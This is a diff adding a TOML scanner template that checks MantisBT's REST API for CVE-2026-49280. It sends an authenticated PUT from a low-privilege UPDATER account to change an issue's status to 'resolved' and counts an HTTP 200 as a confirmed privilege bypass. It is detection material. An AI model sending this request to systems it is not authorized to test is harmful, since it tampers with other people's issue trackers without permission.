@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测MantisBT REST API中低权限用户(UPDATER)越权修改Issue状态的漏洞。通过API Token认证后，尝试修改Issue状态字段，验证是否绕过$g_set_status_threshold权限检查。"
+id = "POC-AVE-2026-0307"
+name = "MantisBT REST API unauthorized Issue status change PoC"
+severity = "medium"
+tags = ["ave-2026-0307"]
+vuln_id = [
+    "CVE-2026-49280",
+    "AVE-2026-0307",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/api/rest/issues/1"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"status":{"name":"resolved"}}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{api_token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
